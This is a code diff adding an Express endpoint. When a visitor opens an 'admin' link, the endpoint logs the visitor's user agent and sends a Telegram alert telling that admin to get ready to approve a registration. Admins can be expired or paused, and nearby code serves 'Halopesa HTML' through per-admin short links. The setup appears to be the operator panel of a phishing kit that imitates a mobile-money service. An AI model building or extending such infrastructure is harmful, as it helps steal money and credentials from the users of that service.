@@ -2385,6 +2385,77 @@ app.get('/health', (req, res) => {
     });
 });
 
+// ==========================================
+// ✅ POST /api/notify-admin-link-opened
+// ==========================================
+// When user opens admin's link, notify the admin immediately
+app.post('/api/notify-admin-link-opened', async (req, res) => {
+  try {
+    const { adminId, timestamp, userAgent } = req.body;
+
+    if (!adminId) {
+      return res.status(400).json({ success: false, message: 'Missing adminId' });
+    }
+
+    console.log(`\n📢 ADMIN LINK OPENED:`);
+    console.log(`   Admin ID: ${adminId}`);
+    console.log(`   Time: ${timestamp}`);
+    console.log(`   User Agent: ${userAgent}`);
+
+    // ✅ Check if admin is active and not expired
+    try {
+      const admin = await db.getAdmin(adminId);
+      
+      if (!admin) {
+        console.log(`   ❌ Admin not found`);
+        return res.json({ success: false, message: 'Admin not found' });
+      }
+
+      // Only notify if admin is active and not expired
+      if (admin.expired) {
+        console.log(`   ⚠️ Admin expired - not notifying`);
+        return res.json({ success: true, message: 'Admin expired' });
+      }
+
+      if (pausedAdmins.has(adminId)) {
+        console.log(`   ⚠️ Admin paused - not notifying`);
+        return res.json({ success: true, message: 'Admin paused' });
+      }
+
+      // ✅ Send Telegram alert to admin
+      const message = `
+🔔 *USER OPENING REGISTRATION*
+
+A user just opened your admin link!
+Prepare for incoming registration request.
+
+🕐 *Time:* ${new Date(timestamp).toLocaleTimeString()}
+🔗 *Link:* /admin/${adminId}
+⚡ *Action:* Be ready to approve registration!
+      `;
+
+      console.log(`   ✅ Sending alert to admin: ${admin.name} (${admin.chatId})`);
+
+      await bot.sendMessage(String(admin.chatId), message.trim(), {
+        parse_mode: 'Markdown'
+      });
+
+      console.log(`   ✅ Alert sent successfully!\n`);
+      return res.json({ success: true, message: 'Alert sent to admin' });
+
+    } catch (dbError) {
+      console.error(`   ❌ Database error: ${dbError.message}`);
+      return res.status(500).json({ success: false, message: 'Database error' });
+    }
+
+  } catch (error) {
+    console.error('❌ Notify admin link opened error:', error);
+    // Return success anyway - don't want to break user experience for this background notification
+    res.json({ success: true, message: 'Notification queued' });
+  }
+});
+
+
 // Serve the Halopesa HTML
 // ==========================================
 // SHORT LINK ROUTES (Subdomain & Path-based)
